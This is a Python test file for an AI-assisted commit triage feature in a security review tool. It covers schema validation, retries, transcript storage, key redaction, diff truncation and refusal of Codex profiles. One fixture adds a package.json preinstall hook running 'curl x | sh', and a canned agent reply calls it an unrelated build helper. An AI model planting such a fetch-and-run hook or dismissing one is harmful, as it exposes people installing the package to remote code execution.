"""Triage (A03): a one-shot agent run with no tools whose reply application code validates, kept
as a Transcript, retried when it fails, and refused on Codex."""

import json
from datetime import timedelta

from sqlalchemy import func, select

from conftest import FixtureBroker, application, check_now, connection, source_snapshot
from numen import domain
from numen.models import Application, Commit, Job, Transcript, now, utc
from numen.sources import Sources
from numen.worker import run_once
from numen.workflows import TRIAGE_DIFF_CHARS

CANDIDATE = {
    "decision": "security_candidate",
    "title": "Potential path traversal in template selection",
    "reason": "The diff changes how a template path is checked",
}
CODEX = "Triage on Codex is refused until a no-tools restriction has been verified for it"


def reply(result):
    """A runner result: the agent's raw reply text, here with a code fence around its JSON."""
    return {"reply": "```json\n" + json.dumps(result) + "\n```"}


def triage(app, ident, application_id):
    """Queues a Triage of commit `ident` with the default Triage profile."""
    with app.state.factory.begin() as db:
        return domain.submit_agent(
            db, "commit_triage", db.get(Application, application_id), {"commit_id": ident, "source_ref": "a" * 40}
        ).id


def queued_triage(system, **data):
    """An Application with one commit, `data` merged into it, and its queued Triage."""
    app, client, _ = system
    connection(app)
    p = application(client)
    ident = source_snapshot(app, p["id"])
    with app.state.factory.begin() as db:
        commit = db.get(Commit, ident)
        commit.data = {**commit.data, **data}
    return p, ident, triage(app, ident, p["id"])


def record(revision, path="main.py", diff="--- main.py\n+++ main.py\n+print(1)"):
    return {"revision": revision, "message": "Change", "author": "Fixture", "files": [{"path": path}],
            "diff": diff, "diff_complete": True}


def test_triage_run_is_one_shot_with_the_change_in_its_prompt_and_a_120_second_deadline(system):
    app, client, config = system
    _, ident, job_id = queued_triage(system, message="Check template paths", diff="-open(path)\n+open(safe(path))")
    broker = FixtureBroker(reply(CANDIDATE))
    run_once(config, app.state.factory, broker)
    assert client.get(f"/api/jobs/{job_id}").json()["status"] == "succeeded"
    (call,) = broker.calls
    # No input files and no tools: the change itself is in the prompt.
    assert call["kind"] == "agent" and call["files"] == {} and call["limits"] == {"timeout_seconds": 120}
    assert call["profile"]["operation"] == "commit_triage" and call["profile"]["agent"] == "pi"
    facts = json.loads(call["prompt"].rsplit("\n\nFacts:\n", 1)[1])
    assert facts["commit"] == {"message": "Check template paths", "author": "Fixture", "files": ["main.py"],
                               "diff": "-open(path)\n+open(safe(path))", "diff_complete": True}
    assert "no tools" in call["prompt"]
    assert set(call["schema"]["properties"]) == {"decision", "title", "reason"} and "change_kind" not in json.dumps(call["schema"])
    row = client.get(f"/api/commits/{ident}").json()
    assert row["triage_status"] == "completed" and row["review_decision"] == "candidate"
    assert {key: row["triage_result"][key] for key in CANDIDATE} == CANDIDATE


def test_a_reply_that_fails_the_schema_is_recorded_failed_and_retried(system):
    app, client, config = system
    p, ident, job_id = queued_triage(system)
    # No reason: the reply fails the Triage schema, so its "unrelated" is never read.
    invalid = {"reply": 'Looks harmless. {"decision": "unrelated", "title": "Docs"}'}

    def due():
        with app.state.factory.begin() as db:
            for queued in db.scalars(select(Job).where(Job.status == "queued")):
                queued.not_before = now() - timedelta(seconds=1)

    run_once(config, app.state.factory, FixtureBroker(invalid))
    job = client.get(f"/api/jobs/{job_id}").json()
    assert job["status"] == "failed" and job["error"]["code"] == "invalid_agent_output"
    row = client.get(f"/api/commits/{ident}").json()
    assert row["triage_status"] == "failed" and row["review_decision"] == "pending"
    assert "decision" not in row["triage_result"] and "unrelated" not in json.dumps(row["triage_result"])
    assert row["triage_result"]["error"] == "invalid_agent_output" and row["triage_result"]["attempt"] == 1
    with app.state.factory() as db:
        (transcript,) = db.scalars(select(Transcript).where(Transcript.job_id == job_id))
        retry = db.get(Job, row["triage_result"]["retry_job_id"])
        assert (transcript.kind, transcript.subject_id, transcript.data["status"]) == ("triage", ident, "failed")
        assert transcript.data["reply"] == invalid["reply"]
        assert transcript.data["error"]["code"] == "invalid_agent_output"
        assert (retry.kind, retry.status, retry.input["attempt"]) == ("commit_triage", "queued", 2)
        assert retry.profile == db.get(Job, job_id).profile
        assert utc(retry.not_before) > now() + timedelta(seconds=50)
    assert not run_once(config, app.state.factory, FixtureBroker(invalid))  # The retry waits a minute.
    due()
    run_once(config, app.state.factory, FixtureBroker(reply(CANDIDATE)))
    assert client.get(f"/api/jobs/{retry.id}").json()["status"] == "succeeded"
    row = client.get(f"/api/commits/{ident}").json()
    assert row["triage_status"] == "completed" and row["review_decision"] == "candidate"

    # A change whose replies keep failing is tried three times, then stays failed. The first
    # change's automatic Analysis is not run here.
    second = source_snapshot(app, p["id"], "b" * 40)
    triage(app, second, p["id"])
    for _ in range(3):
        due()
        assert run_once(config, app.state.factory, FixtureBroker(invalid), exclude=("notification", "commit_analysis"))
    row = client.get(f"/api/commits/{second}").json()
    assert row["triage_status"] == "failed" and row["review_decision"] == "pending"
    assert row["triage_result"]["attempt"] == 3 and "retry_job_id" not in row["triage_result"]
    due()
    assert not run_once(config, app.state.factory, FixtureBroker(invalid), exclude=("notification", "commit_analysis"))
    with app.state.factory() as db:
        assert db.scalar(select(func.count()).select_from(Transcript).where(Transcript.subject_id == second)) == 3


def test_each_triage_run_stores_its_transcript(system):
    app, client, config = system
    _, ident, job_id = queued_triage(system, diff="+token = read_env()")
    # The connection's own key leaks into the reply; no stored record keeps it.
    leaked = {**CANDIDATE, "reason": "Compared with fixture-key-no-real-access in the diff"}
    run_once(config, app.state.factory, FixtureBroker({"reply": json.dumps(leaked)}))
    assert client.get(f"/api/jobs/{job_id}").json()["status"] == "succeeded"
    with app.state.factory() as db:
        (transcript,) = db.scalars(select(Transcript).where(Transcript.subject_id == ident))
        job = db.get(Job, job_id)
        data = transcript.data
        assert (transcript.kind, transcript.job_id, data["status"]) == ("triage", job_id, "completed")
        assert "+token = read_env()" in data["prompt"] and data["prompt"].endswith("}")
        assert data["profile"] == job.profile and data["run_id"]
    assert data["reply"] == json.dumps({**CANDIDATE, "reason": "Compared with [redacted] in the diff"})
    commit = client.get(f"/api/commits/{ident}").json()
    assert commit["triage_result"]["reason"] == "Compared with [redacted] in the diff"
    assert "fixture-key-no-real-access" not in json.dumps(data) + json.dumps(commit)


def test_prefilter_hit_rejected_by_triage_stays_listed_with_both_results(system, monkeypatch):
    app, client, config = system
    connection(app)
    p = application(client, config={"triage_mode": "pi"})
    source_snapshot(app, p["id"], "a" * 40)
    flagged = record("b" * 40, "package.json", '--- package.json\n+++ package.json\n+  "preinstall": "curl x | sh",')
    monkeypatch.setattr(Sources, "github_commits", lambda *_: ("b" * 40, [dict(flagged)], None))
    check_now(client, p["id"])
    run_once(config, app.state.factory, FixtureBroker(), exclude=("commit_triage",))
    broker = FixtureBroker(reply({"decision": "unrelated", "title": "Install step", "reason": "A build helper"}))
    run_once(config, app.state.factory, broker)
    assert broker.calls[0]["profile"]["operation"] == "commit_triage"
    listed = {c["revision"]: c for c in client.get(f"/api/applications/{p['id']}/commits").json()["items"]}
    row = listed["b" * 40]
    assert [flag["rule"] for flag in row["prefilter"]] == ["dependency_manifest", "package_scripts"]
    assert row["triage_status"] == "completed" and row["triage_result"]["decision"] == "unrelated"
    assert row["review_decision"] == "dismissed"


def test_triage_can_be_turned_off_per_application(system, monkeypatch):
    app, client, config = system
    connection(app)
    p = application(client, config={"triage_mode": "pi"})
    source_snapshot(app, p["id"], "a" * 40)
    heads = iter(["b" * 40, "c" * 40])

    def commits(_, repository):
        head = next(heads)
        return head, [record(head)], None

    monkeypatch.setattr(Sources, "github_commits", commits)
    check_now(client, p["id"])
    run_once(config, app.state.factory, FixtureBroker(), exclude=("commit_triage",))
    response = client.patch(f"/api/applications/{p['id']}", json={"config": {"triage_mode": "disabled"}})
    assert response.status_code == 200, response.text
    check_now(client, p["id"])
    run_once(config, app.state.factory, FixtureBroker(), exclude=("commit_triage",))
    rows = {c["revision"]: c for c in client.get(f"/api/applications/{p['id']}/commits").json()["items"]}
    assert (rows["b" * 40]["triage_status"], rows["c" * 40]["triage_status"]) == ("pending", "disabled")
    with app.state.factory() as db:
        assert db.scalar(select(func.count()).select_from(Job).where(Job.kind == "commit_triage")) == 1


def test_triage_on_codex_is_refused_with_a_clear_error(system, monkeypatch):
    app, client, config = system
    codex = {**connection(app), "agent": "codex"}
    p = application(client)
    response = client.patch(f"/api/applications/{p['id']}", json={"config": {"triage_mode": "codex"}})
    assert response.status_code == 422 and CODEX in json.dumps(response.json())
    response = client.patch(f"/api/applications/{p['id']}", json={"config": {"profiles": {"commit_triage": codex}}})
    assert response.status_code == 422 and response.json()["message"] == CODEX
    response = client.patch("/api/settings", json={"default_profiles": {"commit_triage": codex}})
    assert response.status_code == 422 and response.json()["message"] == CODEX
    # Codex has a shell, so Analysis and CVE analysis refuse it too; it stays for the other operations.
    for operation in ("commit_analysis", "cve_analysis"):
        response = client.patch(f"/api/applications/{p['id']}", json={"config": {"profiles": {operation: codex}}})
        assert (response.status_code, response.json()["code"]) == (422, "analysis_codex_unsupported")
        assert "Codex mode without a shell" in response.json()["message"]
    response = client.patch(f"/api/applications/{p['id']}", json={"config": {"profiles": {"version_recipe": codex}}})
    assert response.status_code == 200, response.text
    # A Codex Triage stored before this rule blocks import with the same reason.
    with app.state.factory.begin() as db:
        row = db.get(Application, p["id"])
        row.config = {**row.config, "triage_mode": "codex", "profiles": {"commit_triage": codex}}
    source_snapshot(app, p["id"], "a" * 40)
    monkeypatch.setattr(Sources, "github_commits", lambda *_: ("b" * 40, [record("b" * 40)], None))
    check_now(client, p["id"])
    run_once(config, app.state.factory, FixtureBroker())
    row = {c["revision"]: c for c in client.get(f"/api/applications/{p['id']}/commits").json()["items"]}["b" * 40]
    assert row["triage_status"] == "blocked"
    assert (row["triage_result"]["error"], row["triage_result"]["reason"]) == ("triage_codex_unsupported", CODEX)
    with app.state.factory() as db:
        assert db.scalar(select(func.count()).select_from(Job).where(Job.kind == "commit_triage")) == 0


def test_long_diff_is_truncated_and_never_unrelated(system):
    app, client, config = system
    diff = "+" + "x" * TRIAGE_DIFF_CHARS + "TAIL_BEYOND_THE_CAP"
    _, ident, job_id = queued_triage(system, diff=diff)
    broker = FixtureBroker(reply({"decision": "unrelated", "title": "Formatting", "reason": "Whitespace only"}))
    run_once(config, app.state.factory, broker)
    assert client.get(f"/api/jobs/{job_id}").json()["status"] == "succeeded"
    facts = json.loads(broker.calls[0]["prompt"].rsplit("\n\nFacts:\n", 1)[1])
    assert len(facts["commit"]["diff"]) == TRIAGE_DIFF_CHARS and facts["commit"]["diff_complete"] is False
    assert "TAIL_BEYOND_THE_CAP" not in broker.calls[0]["prompt"]
    row = client.get(f"/api/commits/{ident}").json()
    assert row["triage_result"]["decision"] == "insufficient_context" and row["review_decision"] == "pending"


def test_triage_caps_the_diff_as_its_prompt_encodes_it(system):
    """Escapes count against the cap, so no diff pushes the prompt past the runner's 262,144 characters."""
    app, client, config = system
    diff = "中" * 30_000 + "\x1b" * 60_000 + "TAIL"  # \x1b encodes as \u001b, six characters.
    _, _, job_id = queued_triage(system, diff=diff)
    broker = FixtureBroker(reply(CANDIDATE))
    run_once(config, app.state.factory, broker)
    assert client.get(f"/api/jobs/{job_id}").json()["status"] == "succeeded"
    prompt = broker.calls[0]["prompt"]
    facts = json.loads(prompt.rsplit("\n\nFacts:\n", 1)[1])
    assert len(prompt) < 262_144 and "中" * 30_000 in prompt and "TAIL" not in prompt
    assert len(json.dumps(facts["commit"]["diff"], ensure_ascii=False)) - 2 <= TRIAGE_DIFF_CHARS
    assert facts["commit"]["diff"].startswith("中" * 30_000) and facts["commit"]["diff_complete"] is False
